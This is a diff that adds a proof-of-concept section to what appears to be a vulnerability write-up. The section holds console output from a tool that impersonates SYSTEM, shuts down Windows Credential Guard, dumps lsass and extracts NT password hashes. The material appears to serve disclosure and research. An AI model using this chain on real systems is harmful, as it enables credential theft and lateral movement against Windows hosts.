@@ -53,6 +53,55 @@ The account must exist on the target machine. `LogonUserA` creates the post-shut
 
 ---
 
+## Proof of Concept
+
+```
+C:\Users\sshusers\Downloads>"credguard_poc (1).exe"
+=== credguard_poc.exe (Win11 24H2 / build 26200) ===
+
+[Stage 0] Elevate privileges + impersonate SYSTEM
+    [+] SeDebugPrivilege enabled
+    [+] Thread impersonating SYSTEM via winlogon.exe (PID 720)
+
+[Stage 1] Signal LSA_ISO_DISABLE_CREDENTIAL_GUARD (as SYSTEM)
+    [+] NtSetEvent -> STATUS_SUCCESS (prev state=0)
+
+[Stage 0b] Revert SYSTEM impersonation
+    [+] Reverted to process token
+
+[Stage 2] Waiting for Credguard teardown
+    [~] Sleeping 3s for DisableCredGuardWaitThread to complete...
+    [+] Resumed TCB CredGuard should be OFF (verify: WMI Win32_DeviceGuard.SecurityServicesRunning == 0)
+
+[Stage 3] SeDebugPrivilege (enabled in Stage 0 TCB still active on process token)
+
+[Stage 4] Creating interactive logon session (user=sshusers domain=.)
+    [+] New interactive session LUID = {0x00000000, 0x003B50BB}
+
+[Stage 6] Opening lsass
+    [+] lsass PID = 816
+    [+] Opened lsass handle
+
+[Stage 7] MiniDumpWriteDump -> C:\Windows\Temp\lsass_post.dmp
+    [+] Dump written TCB analyze offline: pypykatz lsa minidump lsass_post.dmp
+
+[Stage 8] Computing NT hash and scanning lsass
+
+[Stage 8] Scanning lsass memory for NT hash
+    [*] MD4(UTF-16LE(pass)) = 8846f7eaee8fb117ad06bdd830b7586c
+    [*] NT hash @ VA 0x000001EF5E6CD127 (MSV1_0_PRIMARY_CREDENTIAL @ 0x000001EF5E6CCF31)
+        NtOwfPassword : 8846f7eaee8fb117ad06bdd830b7586c
+        UserName (+0x18E) :
+    [*] NT hash @ VA 0x000001EF5E75E127 (MSV1_0_PRIMARY_CREDENTIAL @ 0x000001EF5E75DF31)
+        NtOwfPassword : 8846f7eaee8fb117ad06bdd830b7586c
+        UserName (+0x18E) :
+    [+] 2 hit(s) TCB NT hash accessible in VTL0 after CredGuard shutdown!
+
+[done]
+```
+
+---
+
 ## Notes
 
 - The named event disappears after teardown. A second run on the same boot returns `STATUS_OBJECT_NAME_NOT_FOUND (0xC0000034)`: CG is already off.
